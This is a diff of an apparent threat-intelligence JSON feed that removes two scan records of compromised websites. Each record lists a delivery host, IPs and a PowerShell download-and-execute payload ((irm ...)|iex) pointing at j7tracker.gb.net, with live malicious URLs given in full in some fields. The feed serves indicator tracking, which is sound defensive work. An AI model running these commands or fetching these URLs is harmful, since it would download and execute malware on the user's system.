@@ -2336,43 +2336,5 @@
     ],
     "ReportId": "cmwoed01h1z340oml4kvksqv8",
     "ScannedAt": "2026-11-20T03:05:54.133000+00:00"
-  },
-  {
-    "UrlDomain": "i-mill.net",
-    "DeliveryUrl": [
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/b46abcf84e5ae26d"
-    ],
-    "IP": [
-      "217.116.198.154"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/b46abcf84e5ae26d')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/b46abcf84e5ae26d"
-    ],
-    "ReportId": "cmwodzv5l1z250omlqi1hs6dh",
-    "ScannedAt": "2026-11-20T02:55:41.245000+00:00"
-  },
-  {
-    "UrlDomain": "www.portaleimmigrazioneconfial.it",
-    "DeliveryUrl": [
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/4e60a6dcbd4a3cbb"
-    ],
-    "IP": [
-      "89.46.108.46"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/4e60a6dcbd4a3cbb')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/4e60a6dcbd4a3cbb"
-    ],
-    "ReportId": "cmwodzfal1z0v0omlds2tteaj",
-    "ScannedAt": "2026-11-20T02:55:20.673000+00:00"
   }
 ]
